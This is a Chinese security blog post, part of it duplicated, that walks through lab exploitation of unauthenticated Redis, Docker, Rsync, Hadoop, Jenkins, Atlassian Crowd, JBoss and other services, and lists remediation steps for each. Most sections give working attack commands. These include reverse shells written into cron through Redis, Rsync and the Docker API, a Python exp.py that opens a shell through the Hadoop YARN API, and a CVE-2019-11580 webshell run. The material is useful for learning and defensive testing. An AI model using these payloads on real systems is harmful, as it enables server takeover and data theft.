Console`\n\n```\n//或直接访问这个地址\nhttp://172.16.144.157:8080/jmx-console/\n```\n\n![image-20200702154332658](/images/Unauthorized/image-20200702154332658.png)\n\n3、部署远程war\n\n![image-20200702154524903](/images/Unauthorized/image-20200702154524903.png)\n\n```\n输入远程构造好的war的URL并点击“Invoke”\n```\n\n![image-20200702154726454](/images/Unauthorized/image-20200702154726454.png)\n\n##### 漏洞修复\n\n1、jmx控制页面访问添加访问验证\n\n2、JMX Console 安全配置\n\n#### VNC 未授权访问\n\n##### 漏洞描述\n\nVNC 是虚拟网络控制台Virtual Network Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。VNC 默认端口号为 5900、5901。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制target主机。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n需要用gnome桌面，如果服务器安装时使用的最小化安装，那么进行下面操作按章GNOME 桌面\nyum grouplist\t\t\t\t\t\t\t\t\t\t\t\t\t\t# 列出的组列表里有GNOME Desktop\nyum groupinstall -y \"GNOME Desktop\"\t\t\t# 安装\nsystemctl set-default graphical.target  //设置成图形模式\nsystemctl set-default multi-user.target  //设置成命令模式\n# 然后重启即可，或者startx开启图形界面。第一次启动可能时间会长一点，耐心等待即可。\n```\n\n```shell\n# yum install tigervnc-server -y\n//新建服务配置模版\ncp /lib/systemd/system/vncserver@.service /etc/systemd/system/vncserver@:1.service\nvim /etc/systemd/system/vncserver@\\:1.service\n[Unit]\nDescription=Remote desktop service (VNC)\nAfter=syslog.target network.target\n\n[Service]\nType=forking\nUser=root\n\n# Clean any existing files in /tmp/.X11-unix environment\nExecStartPre=-/usr/bin/vncserver -kill %i\nExecStart=/sbin/runuser -l root -c \"/usr/bin/vncserver %i\"\nPIDFile=/root/.vnc/%H%i.pid\nExecStop=-/usr/bin/vncserver -kill %i\n\n[Install]\nWantedBy=multi-user.target\n```\n\n1、端口检测\n\n```shell\n# netstat -ant | grep 5901\ntcp        0      0 0.0.0.0:5901            0.0.0.0:*               LISTEN\ntcp6       0      0 :::5901                 :::*                    LISTEN\n```\n\n![image-20200709155404841](/images/Unauthorized/image-20200709155404841.png)\n\n2、取消鉴权\n\n```shell\n//先停掉服务\n# sudo vncserver -kill :1\n# vncserver :1 -SecurityTypes=none\n```\n\n![image-20200709162439146](/images/Unauthorized/image-20200709162439146.png)\n\n##### 漏洞修复\n\n1、添加用户认证\n\n2、以最小普通权限身份运行操作系统\n\n#### Docker 未授权访问\n\n##### 漏洞描述\n\n​\t\tDocker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台Docker。\n\n​\t\tDocker Remote API 是一个取代远程命令行界面（rcli）的REST API。存在问题的版本分别为 1.3 和 1.6因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n//pip安装\n[root@localhost ~]# yum -y install epel-release\n[root@localhost ~]# yum -y install python-pip\n[root@localhost ~]# pip install --upgrade pip\n[root@localhost ~]# pip install docker-compose\n[root@localhost ~]# yum install docker\nmkdir docker\ncd docker \nwget https://raw.githubusercontent.com/vulhub/vulhub/master/docker/unauthorized-rce/Dockerfile\nwget https://raw.githubusercontent.com/vulhub/vulhub/master/docker/unauthorized-rce/docker-compose.yml\nwget https://raw.githubusercontent.com/vulhub/vulhub/master/docker/unauthorized-rce/docker-entrypoint.sh\n# docker-compose build && docker-compose up -d\nERROR: Couldn't connect to Docker daemon at http+docker://localhost - is it running?\n\nIf it's at a non-standard location, specify the URL with the DOCKER_HOST environment variable.\n//报以上报错因服务未启动\n[root@localhost docker]# sudo systemctl start docker\n//编译并启动\n[root@localhost docker]# docker-compose build && docker-compose up -d\n```\n\n![image-20200706155443054](/images/Unauthorized/image-20200706155443054.png)\n\n1、未授权访问\n\n```\n//nmap端口检测\n➜  Desktop sudo nmap -sS -p 1-65535 -v 172.16.144.135\n//获取远程docker信息\n➜  Desktop docker -H tcp://172.16.144.135:2375 version\n```\n\n![image-20200706155712528](/images/Unauthorized/image-20200706155712528.png)\n\n2、反弹shell\n\n```\nnc -lvnp 9999\n```\n\n启动容器\n\n```shell\ndocker -H tcp://172.16.144.135:2375 run -id -v /etc/crontabs:/tmp alpine:latest\n//主要查看images id值\ndocker -H tcp://172.16.144.135:2375 ps\n//进入进程shell\ndocker -H tcp://172.16.144.135:2375 exec -it fd986b9a93f2 sh\t\t//image id 必须本地拉取新的id值\n//新建计划任务\necho '* * * * * /usr/bin/nc 172.16.144.135 9988 -e /bin/sh' >> /tmp/root\n//获取计划任务信息列表\ncat /tmp/root\n```\n\n![image-20200707103740566](/images/Unauthorized/image-20200707103740566.png)\n\n反弹成功\n\n![image-20200707103806562](/images/Unauthorized/image-20200707103806562.png)\n\n3、未授权访问检测\n\n```shell\n//此脚本可以检测未授权访问漏洞，反弹shell未实验\nhttps://github.com/Tycx2ry/docker_api_vul\n```\n\n##### 漏洞修复\n\n1、2375端口做网络访问控制\n\n2、修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行。\n\n#### ZooKeeper 未授权访问\n\n##### 漏洞描述\n\nZookeeper是分布式协同管理工具，常用来管理系统配置信息，提供分布式协同服务。Zookeeper的默认开放端口是2181。Zookeeper安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper集群内进行破坏（比如：kill命令）。攻击者能够执行所有只允许由管理员运行的命令。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\nwget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz\ntar -xzvf zookeeper-3.4.14.tar.gz \ncd zookeeper-3.4.14/conf\nmv zoo_sample.cfg zoo.cfg\n../bin/zkServer.sh start\t//服务启动\n../bin/zkServer.sh stop\t  //服务停止\n```\n\n![image-20200707111251952](/images/Unauthorized/image-20200707111251952.png)\n\n1、未授权访问\n\n```\necho envi|nc 172.16.144.135 2181\n```\n\n![image-20200707111357506](/images/Unauthorized/image-20200707111357506.png)\n\n2、ZooKeeper可视化\n\n```\nhttps://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip\n```\n\n![image-20200707111758244](/images/Unauthorized/image-20200707111758244.png)\n\n![image-20200707112356764](/images/Unauthorized/image-20200707112356764.png)\n\n##### 漏洞修复\n\n1、修改 ZooKeeper 默认端口，采用其他端口服务\n\n2、添加访问控制，配置服务来源地址限制策略\n\n3、增加 ZooKeeper 的认证配置\n\n#### Rsync 未授权访问\n\n##### 漏洞描述\n\n​\tRsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录。Rsync 默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。Rsync 的默认端口为 `837`。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n//下载项目\nhttps://github.com/vulhub/vulhub/tree/master/rsync/common\n//启动容器\n# docker-compose build && docker-compose up -d\n# docker ps -a\nCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES\n5c1eb59de4a8        common_rsync        \"/docker-entrypoin...\"   13 seconds ago      Up 12 seconds       0.0.0.0:873->873/tcp   common_rsync_1\n```\n\n1、未授权检测\n\n```shell\n# rsync rsync://{target_ip}/\n➜  Downloads rsync rsync://172.16.144.135:873/\nsrc            \tsrc path\n//下载文件至本地\n➜  Downloads rsync rsync://172.16.144.135:873/src/etc/passwd ./\n```\n\n2、反弹shell\n\n```shell\n# 下载crontab配置文件\nrsync rsync://172.16.2.250:873/src/etc/crontab ./\n# 该环境crontab中\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n表示每小时的第17分钟执行run-parts --report /etc/cron.hourly\n```\n\n```shell\n# 写入bash并赋权\nvim nc\n#!/bin/bash\n/bin/bash -i >& /dev/tcp/172.16.144.135/9999 0>&1\nchmod 777 nc\n# 将文件上传至/etc/cron.hourly\nrsync -av nc rsync://172.16.144.135:873/src/etc/cron.hourly\n```\n\n![image-20200707115044398](/images/Unauthorized/image-20200707115044398.png)\n\n```shell\n# 本地监听9999\nnc -lnvp 9999\n```\n\n![image-20200707121738127](/images/Unauthorized/image-20200707121738127.png)\n\n##### 漏洞修复\n\n1、账户认证：正确配置认证用户名及密码\n\n2、权限控制：使用合理的权限\n\n3、网络访问控制：控制接入源ip\n\n4、数据加密传输等\n\n#### Atlassian Crowd 未授权访问\n\n##### 漏洞描述\n\n​\tAtlassian Crowd和Atlassian Crowd Data Center都是澳大利亚Atlassian公司的产品。Atlassian Crowd是一套基于Web的单点登录系统。该系统为多用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center是Crowd的集群部署版。Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了pdkinstall开发插件，使其存在安全漏洞。攻击者利用该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件，执行任意代码/命令，从而获得服务器权限。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\nwget https://product-downloads.atlassian.com/software/crowd/downloads/atlassian-crowd-3.4.3.zip\nunzip atlassian-crowd-3.4.3.zip\ncd atlassian-crowd-3.4.3\nvim crowd-webapp/WEB-INF/classes/crowd-init.properties\n//取消注释\ncrowd.home=/var/crowd-home\n```\n\n执行“Set up Crowd”\n\n![image-20200708113709624](/images/Unauthorized/image-20200708113709624.png)\n\n申请30天试用[license](https://my.atlassian.com/products/index)\n\n```shell\nhttps://my.atlassian.com/license/evaluation?utm_nooverride=1&product=Crowd&version=3.4.3&sid=Server ID&ref=prod\n```\n\n![image-20200708120448211](/images/Unauthorized/image-20200708120448211.png)\n\n如下图所示：安装成功\n\n![image-20200708133857021](/images/Unauthorized/image-20200708133857021.png)\n\n1、未授权测试\n\n```shell\n➜  Atlassian git clone https://github.com/jas502n/CVE-2019-11580.git\n➜  CVE-2019-11580 git:(master) sudo python CVE-2019-11580.py http://172.16.144.135:8095/\nhttp://172.16.144.135:8095//crowd/admin/uploadplugin.action\n\nInstalled plugin /root/atlassian-crowd-3.4.3/apache-tomcat/temp/plugindev-3858334950456985130rce.jar\n\n>>>Get Webshell\t\t\t//已经getshell\n\nhttp://172.16.144.135:8095//crowd/plugins/servlet/exp?cmd=whoami\n\nExec command= whoami\n\nResult= root\n```\n\n![image-20200708134835246](/images/Unauthorized/image-20200708134835246.png)\n\n```shell\n➜  CVE-2019-11580 git:(master) curl http://172.16.144.135:8095//crowd/plugins/servlet/exp\\?cmd\\=id\n```\n\n##### 漏洞修复\n\n1、设置访问/crowd/admin/uploadplugin.action的源ip\n\n2、版本升级\n\n#### CouchDB 未授权访问\n\n##### 漏洞描述\n\n​\tApache CouchDB是一个开源数据库，专注于易用性和成为\"完全拥抱web的数据库\"。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）,默认会在`5984`端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。\n\n​\t在官方配置文档中对HTTP Server的配置有WWW-Authenticate：Set this option to trigger basic-auth popup on unauthorized requests，但是很多用户都没有这么配置，导致漏洞产生\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n# mkdir couchdb\n# wget https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/docker-compose.yml\n# docker-compose build && docker-compose up -d\n```\n\n![image-20200709010005589](/images/Unauthorized/image-20200709010005589.png)\n\n1、未授权访问\n\n```shell\ncurl http://127.0.0.1:5984\ncurl http://127.0.0.1:5984/_config\n```\n\n![image-20200709005955776](/images/Unauthorized/image-20200709005955776.png)\n\n![image-20200709010449342](/images/Unauthorized/image-20200709010449342.png)\n\n##### 漏洞修复\n\n1、添加认证入口\n\n#### Elasticsearch 未授权访问\n\n##### 漏洞描述\n\n​\t\tElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。Elasticsearch的增删改查操作全部由http接口完成。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索。\n  Elasticsearch服务普遍存在一个未授权访问的问题，攻击者通常可以请求一个开放9200或9300的服务器进行恶意攻击。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\nElasticSearch必须jdk8\n//新建用户\n# useradd elasticsearch\n# passwd elasticsearch\n# su elasticsearch\n[elasticsearch@localhost ~]$ wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.5.0.zip\n# unzip elasticsearch-5.5.0.zip\n# cd /elasticsearch-5.5.0/bin\n$ ./elasticsearch -d\n```\n\n1、未授权访问\n\n```shell\n$ curl  127.0.0.1:9200\n```\n\n![image-20200708235939239](/images/Unauthorized/image-20200708235939239.png)\n\n```shell\n$ curl http://172.16.144.135:9200/_nodes\n```\n\n![image-20200709002204225](/images/Unauthorized/image-20200709002204225.png)\n\n##### 漏洞修复\n\n1、访问控制策略，限制IP访问，绑定固定IP\n\n2、在config/elasticsearch.yml中为9200端口设置认证等\n\n#### Hadoop 未授权访问\n\n##### 漏洞描述\n\n​\t\tHadoop是一个由Apache基金会所开发的分布式系统基础架构，由于服务器直接在开放了 Hadoop 机器 HDFS 的 50070 web 端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。\n\n​\t\tHadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。Hadoop=HDFS（文件系统，数据存储技术相关）+ Mapreduce（数据处理），Hadoop的数据来源可以是任何形式，在处理半结构化和非结构化数据上与关系型数据库相比有更好的性能，具有更灵活的处理能力，不管任何数据形式最终会转化为key/value，key/value是基本数据单元。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n//拉取docker-compose\nmkdir hadoop\ncd hadoop/\nwget https://raw.githubusercontent.com/vulhub/vulhub/master/hadoop/unauthorized-yarn/docker-compose.yml\n//编译并启动\ndocker-compose build && docker-compose up -d\n```\n\n1、未授权访问\n\n```shell\nhttp://172.16.144.139:8088/cluster\n```\n\n![image-20200709140307458](/images/Unauthorized/image-20200709140307458.png)\n\n2 、命令执行\n\n本地监听端口，并执行以下exp脚本。\n\nexp.py\n\n```python\n#!/usr/bin/env python\n\nimport requests\n\ntarget = 'http://192.168.18.129:8088/'\nlhost = '192.168.18.138' # put your local host ip here, and listen at port 9999\n\nurl = target + 'ws/v1/cluster/apps/new-application'\nresp = requests.post(url)\napp_id = resp.json()['application-id']\nurl = target + 'ws/v1/cluster/apps'\ndata = {\n    'application-id': app_id,\n    'application-name': 'get-shell',\n    'am-container-spec': {\n        'commands': {\n            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,\n        },\n    },\n    'application-type': 'YARN',\n}\nrequests.post(url, json=data)\n```\n\n3、反弹shell\n\n![image-20200709140921090](/images/Unauthorized/image-20200709140921090.png)\n\n##### 漏洞修复\n\n1、如无必要，关闭 Hadoop Web 管理页面\n\n2、开启身份验证，防止未经授权用户访问\n\n3、设置“安全组”访问控制策略，将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访问包括 50070 以及 WebUI 等相关端口。\n\n#### Jupyter Notebook 未授权访问\n\n##### 漏洞描述\n\n​\t\tJupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。\n如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。\n\n\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n# wget https://raw.githubusercontent.com/vulhub/vulhub/master/jupyter/notebook-rce/docker-compose.yml\n# docker-compose build && docker-compose up -d\n默认监听8888端口\n```\n\n1、未授权访问\n\n```shell\nhttp://172.16.144.139:8888/\n```\n\n![image-20200709145828298](/images/Unauthorized/image-20200709145828298.png)\n\n2、命令执行\n\n```\nhttp://172.16.144.139:8888/terminals/1\n```\n\n![image-20200709145911206](/images/Unauthorized/image-20200709145911206.png)\n\n##### 漏洞修复\n\n1、开启身份验证，防止未经授权用户访问\n\n2、访问控制策略，限制IP访问，绑定固定IP\n\n#### 监听端口\n\n以上未授权漏洞程序默认监听端口情况如下：\n\n```shell\nReids\t: 6379\nMongoDB : 27017\nJenkins : 8089\nMemcached : 11211\nJBoss\t:\t8080\nVNC :\t5900、5901\nDocker\t:\t2375\nZooKeeper : 2181\nRsync\t:\t837\nAtlassian Crowd\t:\t8095\nCouch DB\t:\t5984\nElasticSearch\t: 9200、9300\nHadoop\t:\t 8088\nJupyter Notebook\t:\t8888\n```\n\n#### 参考\n\n```\nhttps://xz.aliyun.com/t/6103#toc-4\nhttps://paper.seebug.org/409/\n```\n","source":"_posts/常见未授权访问.md","raw":"---\ntitle: 常见未授权访问\ndate: 2020-07-11 11:46:21\n---\n\n本文主要介绍和学习关于“未授权访问”漏洞；从字面了解到“未授权”指的是部署的系统未启用认证功能而被直接访问/操作的安全隐患/漏洞。\n\n感谢前人大佬整理,内容参考网上大佬文章整理，您也可直接[看这里](https://xz.aliyun.com/t/6103#toc-12).漏洞环境参考[Vulhub](https://github.com/vulhub/vulhub),部分环境根据漏洞影响范围来选择安装和搭建.\n\n![image-20200709163151943](/images/Unauthorized/image-20200709163151943.png)\n\n<center>虚拟机22G</center>\n\n\n#### 准备\n\n```\n以下环境基本基于centos 7虚拟机部署检测完成。\n1.Docker\n2.jdk 1.8\n3.docker-compose\n4.其他参考各漏洞环境搭建部分.\n```\n\n#### Redis未授权访问\n\n##### 漏洞描述\n\n​\t\tRedis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n# wget http://download.redis.io/releases/redis-2.8.17.tar.gz\n# tar xzvf redis-2.8.17.tar.gz\n# cd redis-2.8.17\n# make\n# cd src/\n# cp redis-server /usr/bin/\n# cp redis-cli /usr/bin/\n# cp redis.conf /etc/\n# redis-server /etc/redis.conf\n```\n\n![image-20200703144429633](/images/Unauthorized/image-20200703144429633.png)\n\n1、连接Redis\n\n本地可下载客户端进行连接Redis进行getshell等操作\n\n![image-20200703144858785](/images/Unauthorized/image-20200703144858785.png)\n\n![image-20200703144912904](/images/Unauthorized/image-20200703144912904.png)\n\n<center>如上图所示连接成功</center>\n2、getshell\n\n```shell\n# 攻击机执行nc监听\nnc -lvnp 9999\n# Redis客户端执行\nset shell \"\\n\\n*/1 * * * * /bin/bash -i>&/dev/tcp/172.16.144.141/9999 0>&1\\n\\n\"\nconfig set dir /var/spool/cron\nconfig set dbfilename root\nsave\n```\n\n还有其他方式进行反弹shell可网上参考\n\n![image-20200704093747944](/images/Unauthorized/image-20200704093747944.png)\n\n<center>getshell</center>\n\n\n##### 漏洞修复\n\n1、限制登录ip\n\n2、添加密码\n\n3、修改默认端口\n\n#### MongoDB 未授权访问\n\n##### 漏洞描述\n\n​\t开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。\n\n​\t造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 --auth 也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n//镜像搜索\n# docker search mongodb\n//拉取镜像\n# docker pull mongo\n//显示mongo镜像\n# docker images mongo\n//创建新的容器\n# docker run -d -p 27017:27017 --name mongodb mongo\n//显示所有容器\n# docker ps -a\n```\n\n1、NoSQLBooster连接\n\n![image-20200704122547655](/images/Unauthorized/image-20200704122547655.png)\n\n##### 漏洞修复\n\n1、MongoDB添加认证：MongoDB启动时添加--auth参数、为MongoDB添加用户\n\n2、启动时加入参数--bind_ip 127.0.0.1 或在/etc/mongodb.conf文件中添加以下内容：bind_ip = 127.0.0.1\n\n\n\n#### Jenkins 未授权访问\n\n##### 漏洞描述\n\n默认情况下 Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进入后台管理服务，通过脚本执行界面从而获取服务器权限。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n//安装并启动Jenkins服务\n# rpm -ivh jenkins-2.7.3-1.1.noarch.rpm\n//修改默认端口\n# vim /etc/sysconfig/jenkins\nJENKINS_PORT=\"8089\"\n//jenkins服务启动\n# service jenkins start\n```\n\n![image-20200706091405075](/images/Unauthorized/image-20200706091405075.png)\n\n![image-20200706091522419](/images/Unauthorized/image-20200706091522419.png)\n\n1、浏览器访问\n\n```shell\nhttp://172.16.144.142:8089/login?from=%2F\n//浏览器访问后输入文件内的密码\n# vim /var/lib/jenkins/secrets/initialAdminPassword\n```\n\n2、未授权访问\n\n```\n//系统\nhttp://172.16.144.142:8089/\n```\n\n![image-20200706094611260](/images/Unauthorized/image-20200706094611260.png)\n\n3、执行命令\n\n```shell\nprintln \"whoami\".execute().text\n```\n\n![image-20200706095024778](/images/Unauthorized/image-20200706095024778.png)\n\n##### 漏洞修复\n\n1、版本升级\n\n2、添加认证，设置强密码复杂度及账号锁定\n\n3、禁止把Jenkins直接暴露在公网\n\n#### Memcached 未授权访问\n\n##### 漏洞描述\n\nMemcached是一个自由开源的，高性能，分布式内存对象缓存系统。\n\nMemcached是一种基于内存的key-value存储，用来存储小块的任意数据（字符串、对象）。这些数据可以是数据库调用、API调用或者是页面渲染的结果。 \n\n Memcached简洁而强大。它的简洁设计便于快速开发，减轻开发难度，解决了大数据量缓存的很多问题。它的API兼容大部分流行的开发语言。 \n\n 本质上，它是一个简洁的key-value存储系统。 \n\n一般的使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态Web应用的速度、提高可扩展性。 \n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n//安装\n# yum install memcached\n//启动\n# systemctl status  memcached.service\n//查看默认配置\n# cat /etc/sysconfig/memcached\n```\n\n1、telnet连接\n\n```shell\ntelnet 172.16.144.142 11211\nnc -vv 172.16.144.142 11211\n无需用户名密码，可以直接连接memcache\n```\n\n![image-20200706104012663](/images/Unauthorized/image-20200706104012663.png)\n\n![image-20200706110511684](/images/Unauthorized/image-20200706110511684.png)\n\n2、nmap检测\n\n```shell\nnmap -p 11211 --script memcached-info 172.16.144.142\n```\n\n![image-20200706105609418](/images/Unauthorized/image-20200706105609418.png)\n\n##### 漏洞修复\n\n-设置Memchached只允许本地访问\n\n```shell\nOPTIONS=\"-l 127.0.0.1\"\t\t//只允许本地访问\n```\n\n-禁止外网访问Memcached 11211端口\n\n#### JBOSS 未授权访问\n\n##### 漏洞描述\n\nJBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。,默认情况下访问 `http://ip:8080/jmx-console` 就可以浏览 JBoss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。\n\n##### 漏洞验证\n\n可参考JBoss漏洞介绍部分\n\n1、URL访问\n\n```\nhttp://172.16.144.157:8080/\n```\n\n![image-20200702154251373](/images/Unauthorized/image-20200702154251373.png)\n\n2、访问`JMX Console`\n\n```\n//或直接访问这个地址\nhttp://172.16.144.157:8080/jmx-console/\n```\n\n![image-20200702154332658](/images/Unauthorized/image-20200702154332658.png)\n\n3、部署远程war\n\n![image-20200702154524903](/images/Unauthorized/image-20200702154524903.png)\n\n```\n输入远程构造好的war的URL并点击“Invoke”\n```\n\n![image-20200702154726454](/images/Unauthorized/image-20200702154726454.png)\n\n##### 漏洞修复\n\n1、jmx控制页面访问添加访问验证\n\n2、JMX Console 安全配置\n\n#### VNC 未授权访问\n\n##### 漏洞描述\n\nVNC 是虚拟网络控制台Virtual Network Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。VNC 默认端口号为 5900、5901。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制target主机。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n需要用gnome桌面，如果服务器安装时使用的最小化安装，那么进行下面操作按章GNOME 桌面\nyum grouplist\t\t\t\t\t\t\t\t\t\t\t\t\t\t# 列出的组列表里有GNOME Desktop\nyum groupinstall -y \"GNOME Desktop\"\t\t\t# 安装\nsystemctl set-default graphical.target  //设置成图形模式\nsystemctl set-default multi-user.target  //设置成命令模式\n# 然后重启即可，或者startx开启图形界面。第一次启动可能时间会长一点，耐心等待即可。\n```\n\n```shell\n# yum install tigervnc-server -y\n//新建服务配置模版\ncp /lib/systemd/system/vncserver@.service /etc/systemd/system/vncserver@:1.service\nvim /etc/systemd/system/vncserver@\\:1.service\n[Unit]\nDescription=Remote desktop service (VNC)\nAfter=syslog.target network.target\n\n[Service]\nType=forking\nUser=root\n\n# Clean any existing files in /tmp/.X11-unix environment\nExecStartPre=-/usr/bin/vncserver -kill %i\nExecStart=/sbin/runuser -l root -c \"/usr/bin/vncserver %i\"\nPIDFile=/root/.vnc/%H%i.pid\nExecStop=-/usr/bin/vncserver -kill %i\n\n[Install]\nWantedBy=multi-user.target\n```\n\n1、端口检测\n\n```shell\n# netstat -ant | grep 5901\ntcp        0      0 0.0.0.0:5901            0.0.0.0:*               LISTEN\ntcp6       0      0 :::5901                 :::*                    LISTEN\n```\n\n![image-20200709155404841](/images/Unauthorized/image-20200709155404841.png)\n\n2、取消鉴权\n\n```shell\n//先停掉服务\n# sudo vncserver -kill :1\n# vncserver :1 -SecurityTypes=none\n```\n\n![image-20200709162439146](/images/Unauthorized/image-20200709162439146.png)\n\n##### 漏洞修复\n\n1、添加用户认证\n\n2、以最小普通权限身份运行操作系统\n\n#### Docker 未授权访问\n\n##### 漏洞描述\n\n​\t\tDocker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台Docker。\n\n​\t\tDocker Remote API 是一个取代远程命令行界面（rcli）的REST API。存在问题的版本分别为 1.3 和 1.6因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n//pip安装\n[root@localhost ~]# yum -y install epel-release\n[root@localhost ~]# yum -y install python-pip\n[root@localhost ~]# pip install --upgrade pip\n[root@localhost ~]# pip install docker-compose\n[root@localhost ~]# yum install docker\nmkdir docker\ncd docker \nwget https://raw.githubusercontent.com/vulhub/vulhub/master/docker/unauthorized-rce/Dockerfile\nwget https://raw.githubusercontent.com/vulhub/vulhub/master/docker/unauthorized-rce/docker-compose.yml\nwget https://raw.githubusercontent.com/vulhub/vulhub/master/docker/unauthorized-rce/docker-entrypoint.sh\n# docker-compose build && docker-compose up -d\nERROR: Couldn't connect to Docker daemon at http+docker://localhost - is it running?\n\nIf it's at a non-standard location, specify the URL with the DOCKER_HOST environment variable.\n//报以上报错因服务未启动\n[root@localhost docker]# sudo systemctl start docker\n//编译并启动\n[root@localhost docker]# docker-compose build && docker-compose up -d\n```\n\n![image-20200706155443054](/images/Unauthorized/image-20200706155443054.png)\n\n1、未授权访问\n\n```\n//nmap端口检测\n➜  Desktop sudo nmap -sS -p 1-65535 -v 172.16.144.135\n//获取远程docker信息\n➜  Desktop docker -H tcp://172.16.144.135:2375 version\n```\n\n![image-20200706155712528](/images/Unauthorized/image-20200706155712528.png)\n\n2、反弹shell\n\n```\nnc -lvnp 9999\n```\n\n启动容器\n\n```shell\ndocker -H tcp://172.16.144.135:2375 run -id -v /etc/crontabs:/tmp alpine:latest\n//主要查看images id值\ndocker -H tcp://172.16.144.135:2375 ps\n//进入进程shell\ndocker -H tcp://172.16.144.135:2375 exec -it fd986b9a93f2 sh\t\t//image id 